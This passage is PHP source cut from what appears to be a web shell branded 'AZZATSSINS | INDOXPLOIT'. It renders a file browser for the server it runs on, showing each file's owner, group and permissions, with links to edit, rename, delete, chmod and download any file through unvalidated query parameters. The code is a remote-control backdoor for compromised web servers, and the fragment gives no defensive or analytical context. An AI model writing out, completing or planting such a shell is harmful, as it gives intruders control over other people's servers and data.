				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=chmod&dir=$dir&file=$dir/$file'>chmod</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<hr>";
		}
}
	echo "<center><br><br><b><i><fieldset><font color=lime size=-20><a href=http://fb.me/AZZATSSINS.CYBERSERKERS>AZZATSSINS | INDOXPLOIT</a></font></fieldset></i></b></center>";
?>